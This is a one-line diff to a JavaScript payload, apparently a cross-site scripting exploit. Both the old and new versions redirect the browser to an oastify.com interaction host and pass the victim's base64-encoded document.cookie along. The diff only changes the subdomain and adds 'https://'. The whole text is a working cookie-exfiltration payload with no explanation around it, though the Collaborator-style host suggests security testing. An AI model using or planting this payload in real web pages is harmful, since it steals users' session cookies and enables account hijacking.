@@ -1,1 +1,1 @@
-document.location = "edv03qux16nqaonho4ol36budljc72vr.oastify.com/a?c=" + btoa(document.cookie);
+document.location = "https://0nomdc4jbsxckax3yqy7dslgn7tyhp5e.oastify.com/a?c=" + btoa(document.cookie);
